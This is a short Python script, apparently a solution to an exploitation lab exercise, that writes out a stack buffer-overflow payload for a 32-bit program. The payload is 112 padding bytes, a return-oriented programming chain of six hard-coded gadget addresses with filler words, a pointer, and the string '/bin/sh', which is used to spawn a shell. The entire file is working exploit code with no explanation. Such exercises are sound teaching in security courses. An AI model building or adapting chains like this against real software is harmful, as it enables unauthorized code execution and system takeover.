#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
gadget1 = pack("<I", 0x0805c393)
gadget2 = pack("<I", 0x08049a33)
gadget3 = pack("<I", 0x080703c6)
gadget4 = pack("<I", 0x0805e5fc)
gadget5 = pack("<I", 0x080481c9)
gadget6 = pack("<I", 0x0806e7b0)

junk = pack("<I", 0xdeadbeef)

ptrptr_cmd = pack("<I", 0xfffe8ee0)
#ptr_cmd = pack("<I", 0xfffe8ee4)
shell_cmd = b'/bin/sh'

sys.stdout.buffer.write(b'\xaa' * 112 + gadget1 + junk * 3 + gadget2 + junk * 4 + gadget3 + ((gadget4 + junk) * 12) + gadget5 + ptrptr_cmd + gadget6 + shell_cmd)
